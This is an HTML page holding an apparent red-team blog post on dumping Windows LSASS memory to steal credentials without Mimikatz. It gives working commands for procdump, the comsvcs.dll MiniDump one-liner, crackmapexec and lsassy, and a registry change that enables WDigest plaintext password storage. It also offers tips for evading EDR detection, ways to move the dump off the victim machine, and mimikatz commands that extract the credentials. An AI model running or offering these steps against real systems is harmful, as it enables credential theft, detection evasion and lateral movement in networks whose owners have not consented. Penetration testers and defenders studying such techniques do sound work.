<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Dumping LSASS Without Mimikatz" /><meta property="og:locale" content="en" /><meta name="description" content="Mimikatz is a tool for dumping credentials from memory in Windows. It is a great tool for lateral and vertical privilege escalation in Windows Active Directory environments. Due to its popularity, the Mimikatz executable and PowerShell script are detected by most of the Antivirus (AV) solutions out there. In this article, I will talk about using several alternative methods to achieve the same goal without the need to modify the Mimikatz." /><meta property="og:description" content="Mimikatz is a tool for dumping credentials from memory in Windows. It is a great tool for lateral and vertical privilege escalation in Windows Active Directory environments. Due to its popularity, the Mimikatz executable and PowerShell script are detected by most of the Antivirus (AV) solutions out there. In this article, I will talk about using several alternative methods to achieve the same goal without the need to modify the Mimikatz." /><link rel="canonical" href="https://secybr.com/posts/dumping-lsass-without-mimikatz/" /><meta property="og:url" content="https://secybr.com/posts/dumping-lsass-without-mimikatz/" /><meta property="og:site_name" content="secybr penetration testing, red teaming and hack tricks." /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-08T00:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Dumping LSASS Without Mimikatz" /><meta name="twitter:site" content="@0xhav0c" /><meta name="google-site-verification" content="405asbYxUs5N1iqL1zGg56yq-OlAtdexlSaC3FC7c9s" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-12-08T15:05:37+03:00","datePublished":"2022-12-08T00:00:00+03:00","description":"Mimikatz is a tool for dumping credentials from memory in Windows. It is a great tool for lateral and vertical privilege escalation in Windows Active Directory environments. Due to its popularity, the Mimikatz executable and PowerShell script are detected by most of the Antivirus (AV) solutions out there. In this article, I will talk about using several alternative methods to achieve the same goal without the need to modify the Mimikatz.","headline":"Dumping LSASS Without Mimikatz","mainEntityOfPage":{"@type":"WebPage","@id":"https://secybr.com/posts/dumping-lsass-without-mimikatz/"},"url":"https://secybr.com/posts/dumping-lsass-without-mimikatz/"}</script><title>Dumping LSASS Without Mimikatz | secybr | penetration testing, red teaming and hack tricks.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="secybr | penetration testing, red teaming and hack tricks."><meta name="application-name" content="secybr | penetration testing, red teaming and hack tricks."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><meta content="secybr | penetration testing, red teaming and hack tricks." property="og:site_name"><meta content="Dumping LSASS Without Mimikatz" property="og:title"><meta content="article" property="og:type"><meta content="penetration testing, red teaming and hack tricks." property="og:description"><meta content="https://secybr.com/posts/dumping-lsass-without-mimikatz/" property="og:url"><meta content="2022-12-08T00:00:00+03:00" property="article:published_time"><meta content="https://secybr.com/about/" property="article:author"><meta content="https://secybr.com/assets/img/logo/logo.png" property="og:image"><meta content="red-team" property="article:tag"><meta content="lsass" property="article:tag"><meta content="mimikatz" property="article:tag"><meta content="procdump" property="article:tag"><meta content="Comsvcs" property="article:tag"><meta content="crackmapexec" property="article:tag"><meta content="LSASSY" property="article:tag"><meta content="wdigest" property="article:tag"><meta property="og:image" content="https://secybr.com/assets/img/logo/logo.png"><meta name="twitter:site" content="secybr"><meta name="twitter:creator" content="0xhav0c"><meta name="twitter:title" content="Dumping LSASS Without Mimikatz"><meta name="twitter:description" content="penetration testing, red teaming and hack tricks."><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://secybr.com/assets/img/logo/logo.png"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6320091248407168" crossorigin="anonymous"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/logo/logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">secybr</a></div><div class="site-subtitle">is a product of 0xhav0c</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>WHO AM I?</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xhav0c" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xhav0c" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xhavocc','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Dumping LSASS Without Mimikatz</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Dumping LSASS Without Mimikatz</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1670446800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 8, 2022 </em> </span> <span> Updated <em class="" data-ts="1670501137" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 8, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/0xhav0c">0xhav0c</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1029 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><p>Mimikatz is a tool for dumping credentials from memory in Windows. It is a great tool for lateral and vertical privilege escalation in Windows Active Directory environments. Due to its popularity, the Mimikatz executable and PowerShell script are detected by most of the Antivirus (AV) solutions out there. In this article, I will talk about using several alternative methods to achieve the same goal without the need to modify the Mimikatz.</p><h1 id="what-is-lsass">What is LSASS?</h1><p>The Local Security Authority Subsystem Service (LSASS) is the service in Microsoft Windows that manages all user authentication, password changes, generation of access tokens, and enforcement of security policies. For example, when you log on to a Windows user account or server, lsass.exe verifies the login name and password.</p><p><img data-src="/assets/img/pitcures/red-team/dumplsass.png" alt="Untitled" data-proofer-ignore></p><h1 id="requirements-to-get-dump-from-lsass">Requirements to Get DUMP from LSASS</h1><p>It is necessary to have <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> privilege to dump LSASS as an attacker. The default Windows setting is to give this privilege to local administrators. You can check the rights with the command below.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">whoami</span> /priv
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass1.png" alt="Untitled" data-proofer-ignore></p><h1 id="lsass-dump-getting-methods">LSASS Dump Getting Methods</h1><h2 id="method-1--getting-lsass-dump-with-task-manager-gui"><span class="mr-2">Method 1- Getting LSASS Dump with Task Manager (GUI)</span><a href="#method-1--getting-lsass-dump-with-task-manager-gui" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If you have Remote Desktop Protocol (RDP) session or other GUI access to the device, you can use the Windows Task Manager to create a dump file. By default, Windows Defender does not warn about threats.</p><p>From the Task Manager go to the <code class="language-plaintext highlighter-rouge">Details</code> tab, find <code class="language-plaintext highlighter-rouge">lsass.exe</code>, right click and select <code class="language-plaintext highlighter-rouge">Create dump file</code>.</p><p>This will create a dump file in the user’s <code class="language-plaintext highlighter-rouge">C:\Users\0xhav0c\AppData\Local\Temp</code> directory:</p><p><img data-src="/assets/img/pitcures/red-team/dumplsass2.png" alt="Untitled" data-proofer-ignore></p><h2 id="method-2--getting-lsass-dump-with-procdump"><span class="mr-2">Method 2- Getting LSASS Dump with ProcDump</span><a href="#method-2--getting-lsass-dump-with-procdump" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> is a Windows SysInternals tool that can be used to create memory dumps of processes. The disadvantage of this method is that you have to copy the Procdump executable to the target machine, and some organizations warn the binary as malicious.</p><p>To create a LSASS memory dump:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>PS C:<span class="se">\U</span>sers<span class="se">\0</span>xhav0c&gt; procdump.exe <span class="nt">-accepteula</span> <span class="nt">-ma</span> lsass.exe out.dmp
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass3.png" alt="Downloading ProcDump on victim machine with evil-winrm session" data-proofer-ignore> <em>Downloading ProcDump on victim machine with evil-winrm session</em></p><p><img data-src="/assets/img/pitcures/red-team/dumplsass4.png" alt="Simple web server on attacker machine for share procdump files" data-proofer-ignore> <em>Simple web server on attacker machine for share procdump files</em></p><p><img data-src="/assets/img/pitcures/red-team/dumplsass5.png" alt="Getting LSASS Dump with ProcDump.exe" data-proofer-ignore> <em>Getting LSASS Dump with ProcDump.exe</em></p><p>Some EDR solutions warn or block this based on the <code class="language-plaintext highlighter-rouge">lsass</code> process name. This can usually be bypassed by specifying the LSASS transaction ID instead.</p><p>To get the LSASS process ID via PowerShell:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>PS C:<span class="se">\U</span>sers<span class="se">\0</span>xhav0c&gt; get-process lsass
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass6.png" alt="Finding lsass.exe PID with Powershell" data-proofer-ignore> <em>Finding lsass.exe PID with Powershell</em></p><p>To get the LSASS process ID with CMD:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:<span class="se">\U</span>sers<span class="se">\0</span>xhav0c&gt; tasklist | findstr lsass
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass7.png" alt="Finding lsass.exe PID with CMD" data-proofer-ignore> <em>finding lsass.exe PID with CMD</em></p><p>Then dump the findstr value with the same procdump:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:<span class="se">\U</span>sers<span class="se">\0</span>xhav0c&gt; procdump.exe <span class="nt">-accepteula</span> <span class="nt">-ma</span> 528 out.dmp
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass8.png" alt="Dumping lsass.exe with procdump.exe after finding lsass.exe PID" data-proofer-ignore></p><p>Additionally, depending on the EDR, you can simply add quotes around the transaction name</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PS C:<span class="se">\U</span>sers<span class="se">\0</span>xhav0c&gt; procdump.exe <span class="nt">-accepteula</span> <span class="nt">-ma</span> “lsass.exe” out.dmp
<span class="c">#or</span>
PS C:<span class="se">\U</span>sers<span class="se">\0</span>xhav0c&gt; procdump.exe <span class="nt">-accepteula</span> <span class="nt">-ma</span> <span class="s1">'lsass.exe'</span> out.dmp
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass9.png" alt="Untitled" data-proofer-ignore></p><h2 id="method-3--getting-lsass-dump-with-comsvcs"><span class="mr-2">Method 3- Getting LSASS Dump with Comsvcs</span><a href="#method-3--getting-lsass-dump-with-comsvcs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With Comsvcs you can create a memory dump using native libraries available on Windows machines.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># Detect the PID for lsass.exe</span>
PS C:<span class="se">\U</span>sers<span class="se">\0</span>xhav0c&gt; tasklist | findstr lsass
lsass.exe                      524 Services                   0     51,752 K
<span class="c"># Dumping LSASS.exe</span>
PS C:<span class="se">\U</span>sers<span class="se">\0</span>xhav0c&gt; C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\r</span>undll32.exe C:<span class="se">\w</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>omsvcs.dll, MiniDump 524 C:<span class="se">\t</span>emp<span class="se">\o</span>ut.dmp full
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass10.png" alt="Finding lsass.exe pid and getting LSASS dump with Comsvcs." data-proofer-ignore> <em>Finding lsass.exe pid and getting LSASS dump with Comsvcs.</em></p><h2 id="method-4--getting-lsass-dump-with-crackmapexec"><span class="mr-2">Method 4- Getting LSASS Dump with Crackmapexec</span><a href="#method-4--getting-lsass-dump-with-crackmapexec" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Crackmapexec is an excellent tool for performing a LSASS dump remotely. With credentials with local admin access, you can to indicate an entire subnet or list of IP addresses and get.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>crackmapexec smb 192.168.x.x <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> Password123! <span class="nt">--lsa</span>
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass11.png" alt="Getting LSASS dump with Crackmapexec." data-proofer-ignore> <em>Getting LSASS dump with Crackmapexec.</em></p><p><img data-src="/assets/img/pitcures/red-team/dumplsass12.png" alt="stored hashes and plaintext password outputs." data-proofer-ignore> <em>Stored hashes and plaintext password outputs.</em></p><blockquote class="prompt-tip"><div><p>If Crackmapexec catches hashes and plaintext passwords, it will keep it in its home directory under <code class="language-plaintext highlighter-rouge">~/.cme/logs/</code>.</p></div></blockquote><p>CrackMapExec uses Impacket’s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump.py</a> to dump LSASS.</p><h2 id="method-5--getting-lsass-dump-with-lsassy"><span class="mr-2">Method 5- Getting LSASS Dump with lsassy</span><a href="#method-5--getting-lsass-dump-with-lsassy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://github.com/Hackndo/lsassy">Lsassy</a> is a tool that uses a combination of the above methods to offload LSASS remotely. The default command attempts to use the <code class="language-plaintext highlighter-rouge">comsvcs.dll</code> method to offload LSASS with WMI or a remote scheduled task:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>lsassy <span class="nt">-d</span> secybr.com <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> Password123! 192.168.x.x
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass13.png" alt="Getting LSASS dump with lsassy" data-proofer-ignore> <em>Getting LSASS dump with lsassy</em></p><p>Lsassy is also available in crackmapexec.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>crackmapexec smb 192.168.x.x <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> Password123! <span class="nt">-M</span> lsassy
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass14.png" alt="Getting LSASS dump with Crackmapexec lsassy module." data-proofer-ignore> <em>Getting LSASS dump with Crackmapexec lsassy module.</em></p><p>The methods shown up to this section were for devices that hold hashes and plaintext credentials.</p><h2 id="enabling-wdigest-and-obtaining-plain-text-credentials"><span class="mr-2">Enabling Wdigest and Obtaining Plain Text Credentials</span><a href="#enabling-wdigest-and-obtaining-plain-text-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>WDigest is disabled on newer machines. It is possible for attackers to enable this plaintext credentials when a user logs in. WDigest can be enabled by setting the required registry key to “1” instead of “0”:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:<span class="se">\U</span>sers<span class="se">\0</span>xhav0c&gt; reg add HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\S</span>ecurityProviders<span class="se">\W</span>Digest /v UseLogonCredential /d 1
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass15.png" alt="Entering a registry key." data-proofer-ignore> <em>Enabling Wdigest with entering a registry key.</em></p><p><img data-src="/assets/img/pitcures/red-team/dumplsass16.png" alt="On victim machine: Attached registry image." data-proofer-ignore> <em>On victim machine: Attached registry image.</em> Additionally, this can be done remotely with Crackmapexec:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>crackmapexec smb 192.168.x.x <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-M</span> wdigest <span class="nt">-o</span> <span class="nv">action</span><span class="o">=</span><span class="nb">enable
</span>SMB         192.168.x.x    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2012 R2 Standard 9600 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:secybr.com<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         192.168.x.x    445    DC               <span class="o">[</span>+] secybr.com<span class="se">\0</span>xhav0c:Password123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
WDIGEST     192.168.x.x    445    DC               <span class="o">[</span>+] UseLogonCredential registry key created successfully
</pre></table></code></div></div><h1 id="moving-dump-files-to-attacker-device">Moving Dump Files to Attacker Device</h1><p>Once you have the dump file, you can transfer it to the device where you can use mimikatz in many ways.</p><ul><li>You can copy paste with RDP.<li>You can mount your disk to that device before sending the RDP connection.<li>You can create a simple PHP page, configure it to accept file uploads to this address, and transfer the file to yourself with a POST request with Powershell on the victim device.<li>If the victim has python on the device, you can create a simple web page by using the <code class="language-plaintext highlighter-rouge">http-server</code> module.<li>Or you can upload it to an upload site that comes to mind first and get it from there.</ul><h1 id="examining-dump-files">Examining Dump Files</h1><h2 id="method-1---examining-dump-files-using-pypkatz"><span class="mr-2">Method 1 - Examining Dump Files Using pypkatz</span><a href="#method-1---examining-dump-files-using-pypkatz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>pypykatz lsa minidump lsass.DMP
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass18.png" alt="Examining dump files using pypkatz (Since the output is long, it is shared to the terminal.)" data-proofer-ignore> <em>Examining dump files using pypkatz (Since the output is long, it is shared to the terminal.)</em></p><h2 id="method-2---examining-dump-files-using-mimikatzexe"><span class="mr-2">Method 2 - Examining Dump Files using mimikatz.exe</span><a href="#method-2---examining-dump-files-using-mimikatzexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After obtaining the dump file, download Mimikaz on a windows device that belongs to you.</p><blockquote class="prompt-warning"><div><p>Make sure to create an exception folder for Windows Defender on the machine where you are using Mimikatz, otherwise Defender Mimikatz will quarantine your executable. Run Mimikatz.</p></div></blockquote><p>Use the following commands to extract the credentials from your LSASS Dump file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>sekurlsa::minidump lsass.DMP
sekurlsa::logonPasswords
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/red-team/dumplsass19.png" alt="Examining dump files with mimikatz.exe" data-proofer-ignore> <em>Examining dump files with mimikatz.exe</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/red-team/" class="post-tag no-text-decoration" >red-team</a> <a href="/tags/lsass/" class="post-tag no-text-decoration" >lsass</a> <a href="/tags/mimikatz/" class="post-tag no-text-decoration" >mimikatz</a> <a href="/tags/procdump/" class="post-tag no-text-decoration" >procdump</a> <a href="/tags/comsvcs/" class="post-tag no-text-decoration" >Comsvcs</a> <a href="/tags/crackmapexec/" class="post-tag no-text-decoration" >crackmapexec</a> <a href="/tags/lsassy/" class="post-tag no-text-decoration" >LSASSY</a> <a href="/tags/wdigest/" class="post-tag no-text-decoration" >wdigest</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Dumping+LSASS+Without+Mimikatz+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&url=https%3A%2F%2Fsecybr.com%2Fposts%2Fdumping-lsass-without-mimikatz%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Dumping+LSASS+Without+Mimikatz+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&u=https%3A%2F%2Fsecybr.com%2Fposts%2Fdumping-lsass-without-mimikatz%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fsecybr.com%2Fposts%2Fdumping-lsass-without-mimikatz%2F&text=Dumping+LSASS+Without+Mimikatz+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks." data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/subdomain-enumeration-methods/">Subdomain Enumeration Methods</a><li><a href="/posts/shodan-tutorials-for-best-practicies/">Shodan.io Tutorials for Best Practices</a><li><a href="/posts/collecting-target-email-address/">Collecting Target Email Addresses</a><li><a href="/posts/evasion-tactics-for-scanning-targets/">Evasion Tactics For Scanning Targets (Active Scan)</a><li><a href="/posts/dumping-lsass-without-mimikatz/">Dumping LSASS Without Mimikatz</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 